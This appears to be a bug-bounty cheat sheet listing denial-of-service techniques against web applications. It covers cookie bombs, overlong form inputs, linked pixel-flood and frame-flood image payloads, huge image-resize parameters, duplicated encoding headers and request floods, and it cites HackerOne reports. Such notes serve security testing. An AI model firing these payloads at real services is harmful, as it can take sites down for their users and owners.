## 1. Cookie bomb
   
```
https://target.com/index.php?param1=xxxxxxxxxxxxxx
After input "xxxxxxxxxxxxxx" as a value of param1, check your cookies. If there is cookies the value is "xxxxxxxxxxxxxxxxxxxxxx" it means the website is vulnerable
```

## 2. Try input a very long payload to form. For example using very long password or using very long email
```
POST /register HTTP/1.1
Host: target.com
...
username=victim&password=aaaaaaaaaaaaaaa
```

## 3. Pixel flood, using image with a huge pixels

Download the payload: [Here](https://daffa.tech/lottapixel3.jpg)

## 4. Frame flood, using GIF with a huge frame

Download the payload: [Here](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/000/136/902000ac102f14a36a4d83ed9b5c293017b77fc7/uber.gif?response-content-disposition=attachment%3B%20filename%3D%22uber.gif%22%3B%20filename%2A%3DUTF-8%27%27uber.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ245MJJPA%2F20200910%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20200910T110848Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEFMaCXVzLXdlc3QtMiJHMEUCIEC768ifpRHeEUucuNuVL%2FdcSsWMnGeNp%2FMhKs6afB01AiEAiZOP%2FwMaeQMITUni3aFcACIOqOHnWHgLKuXHRrb5LooqtAMIXBABGgwwMTM2MTkyNzQ4NDkiDHHy9PJ2ccl9cmsvyCqRA6bliBHBMPXR6NYflM%2BCXCCQ5VLdPCATpmLs9DhVuYsjxR3JUtVHnBvtfEYYWDWWsLoC3xuzmug5ycrAvqK%2BTYDYO7l4HD1rXfyEBkR579ZlUFab6bOL4i8nDqblun%2FeV253Sgd6GzL4E%2FXmUN%2FC6qNydSd9hp2fLoyNjqob6o5zJjmnqvZsq50ROOZwf1idkDtr163qeVZERnan7aY9rM%2FsX4iVdE4wY0rLw1maGRuDF2aLVCxPB681htsHt%2FpoZ18QY7LjcbNjbjB4PgXLd1sm5zQ4q9mPVxTZPvzo9BJCh7l6kMLHCtJXOXfrvvN8UBgIqr1KXvodzv7FRQYcvEpfw4pwCTWzBs8VeEcwS9gjOXFMNLNI8SZ9V76VQ5KrOIpKhzM9UQQN3DVzY3SwMHydX%2B%2BYcQTt%2FjvqTkorsltqob2g5E1K0U8btRLBvBqOo0Vbr75zLcLUUomDBQzSNSvJgTN43huYmkZxBpWAAId72Tt6m56aFQLXkCKGSoMxYjrrVW9jc37pVl3lZU7FIX0AMIuN6PoFOusBpDCrjFwR1Y7t7W8wLapYjI6yOkkvWTFwWvx38jZl9okqo5xchKolmKxKX7cfGPIyuUmSXc1xa0nKwYeOYlhQZfyI0NobqyWW81ITuuUjsBxULuqrXqfVl0PTjTTpqe%2FHvU6wYSE358XfggtcqaH9PPgNDOejgv%2FLnh9AH9nyqIWuaCu865IfAOupVVzFzQilyB2LDyQtTS4Kp5dHyEAibRQlqeKHWOkUE2mQefAaTxKLRKrs0mJQYSuC%2B4LQEB3Cq9Nhj5HN%2BYT7A7CDLrvyChyfYXQZYr0lR1jN91Yd7SBe2jB1Qls%2Bx%2FEUlQ%3D%3D&X-Amz-Signature=910a3812cf3b69f6fa72f39a89a6df2f395f8d17ef8702eeb164a0477c64fff5)

## 5. Parameter that can adjust the size of the image
```
Sometimes in website we found a parameter that can adjust the size of the image, for example
https://target.com/img/vulnerable.jpg?width=500&height=500
Try change "500" to "99999999999"
https://target.com/img/vulnerable.jpg?width=99999999999&height=99999999999
```

## 6. Try changing the value of the header with something new, for example:
```
Accept-Encoding: gzip, gzip, deflate, br, br
```

## 7. No Rate Limi
```
Sometimes if you try bug "No rate limit", after a long try it. The server will go down because there is so much requests
```

### References:
- [Hackerone #840598](https://hackerone.com/reports/840598)
- [Hackerone #105363](https://hackerone.com/reports/105363)
- [Hackerone #390](https://hackerone.com/reports/390)
- [Hackerone #400](https://hackerone.com/reports/400)
- [Hackerone #751904](https://hackerone.com/reports/751904)
- [Hackerone #861170](https://hackerone.com/reports/861170)
- [Hackerone #892615](https://hackerone.com/reports/892615)
- [Hackerone #511381](https://hackerone.com/reports/511381)
- [Hackerone #409370](https://hackerone.com/reports/409370)
